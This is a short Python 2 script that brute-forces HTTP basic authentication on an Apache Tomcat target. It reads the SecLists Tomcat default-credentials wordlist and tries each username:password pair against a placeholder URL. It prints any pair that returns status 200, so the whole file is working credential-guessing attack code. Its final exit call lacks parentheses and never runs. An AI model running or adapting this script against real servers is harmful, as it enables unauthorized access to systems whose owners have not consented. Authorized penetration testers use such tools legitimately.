#!/bin/python
import requests , sys
with open ( '/home/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt' ) as m :
    for n in m :
        q = n.strip ( '\n' ).split ( ':' )
        if requests.get ( '<insert affected URL here>' , auth = ( q [ 0 ] , q [ 1 ] ) ).status_code == 200 :
            print 'The credentials \033[0;92m' + n.strip ( '\n' ) + '\033[0m are valid!'
            sys.exit
